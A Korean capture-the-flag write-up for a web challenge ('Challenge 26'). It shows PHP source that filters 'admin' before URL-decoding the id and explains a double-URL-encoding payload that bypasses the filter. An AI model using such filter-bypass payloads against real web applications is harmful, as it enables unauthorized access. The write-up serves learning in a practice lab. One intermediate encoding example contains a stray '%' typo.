# php

```php+HTML
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 26</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }    
a { color:lightgreen; }
</style>
</head>
<body>
<?php
  if(preg_match("/admin/",$_GET['id'])) { echo"no!"; exit(); }
  $_GET['id'] = urldecode($_GET['id']);
  if($_GET['id'] == "admin"){
    solve(26);
  }
?>
<br><br>
<a href=?view_source=1>view-source</a>
</body>
</html>
```

`preg_match(정규식, 검사할 문자열)` =>있으면 1, 없으면 0 반환.
id에 `admin` 이 들어가야 한다. 

```
/?id=admin
```

근데 저거 그대로 들어가면, 필터링에 걸린다.
그래서, 뒤에 `urldecode` 를 하는 것에 주목, admin을 urlencode 해서 넣는다. 

원래 알파벳은 퍼센트 인코딩을 할 필요가 없다. 
하지만, 가능은 하다. 표를 보고 바꾸면 admin은 아래와 같이 인코딩 가능.

```
/?id=%61%64%6d%69%%6e
```

하지만, 이렇게 넣어도 브라우져에서 요청을 보낼때, 디코딩을 해서 보내기 때문에 admin이 preg_match에 걸린다. 

그래서 저걸 url인코더에 넣어서 한번더 인코딩을 한다. 
그러면 브라우져에서 디코딩된 값이 `%61%64%6d%69%%6e` 이게 되서 admin을 잡는 preg_match를 우회할 수 있고, 
다시 한 번 urldecode를 하면서 `admin` 이라는 본연의 값이 나오게 된다.

```
/?id=%2561%2564%256d%2569%256e
```



> urlencode 를 이용하여 우회하는 방법으로 저번에는 %00 null 인코딩을 이용했는데, 이번에는 그냥 인코딩 디코딩을 이용해봤다. 
> 하나 배운 거는 브라우져에서 자동으로 디코딩을 해서 서버로 보낸 다는 것.
> 그래서 인코딩된 값을 보내기 위해서는 두 번 인코딩을 해야한다.